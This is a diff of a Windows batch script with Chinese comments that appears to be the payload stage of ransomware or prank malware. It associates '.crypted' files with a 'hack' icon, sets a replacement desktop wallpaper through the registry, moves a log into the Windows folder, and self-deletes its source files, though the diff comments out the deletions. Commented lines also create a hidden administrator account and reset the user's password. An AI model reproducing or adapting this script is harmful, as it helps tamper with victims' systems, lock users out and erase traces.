@@ -1,22 +1,22 @@
 ::@echo off
-@del /s /q/ f %~dp0\mail.bat
-@del /s /q/ f %~dp0\robot.bat
+::del /s /q/ f %~dp0\mail.bat
+::del /s /q/ f %~dp0\robot.bat
 ::关联被hack的文件图标并删除源文件
 copy %~dp0\520.ico %WINDIR%\520.ico
-@del /s /q/ f %~dp0\520.ico
+::del /s /q/ f %~dp0\520.ico
 @assoc .crypted=hack
 @ftype hack=
 @reg add HKEY_CLASSES_ROOT\hack\DefaultIcon /ve /d "%WINDIR%\520.ico" /f
 ::更改桌面壁纸
 @if not exist %WINDIR%\Web\Wallpaper md %WINDIR%\Web\Wallpaper
 @copy %~dp0\123.jpg %WINDIR%\Web\Wallpaper.jpg
-@del /s /q /f %~dp0\123.jpg
+::del /s /q /f %~dp0\123.jpg
 @reg add "hkcu\control panel\desktop" /v "wallpaper" /d "%WINDIR%\Web\Wallpaper.jpg" /f
 ::刷新系统
 @RunDll32.exe USER32.DLL,UpdatePerUserSystemParameters
 ::拷贝日志到系统盘根目录并删除源文件夹里的日志
 copy %~dp0\log.txt %WINDIR%\log.txt
-del /s /q/ f %~dp0\log.txt
+::del /s /q/ f %~dp0\log.txt
 ::net user 加qq123456 123 /add
 ::net localgroup administrators 加qq123456 /add
 ::net user %username% 789
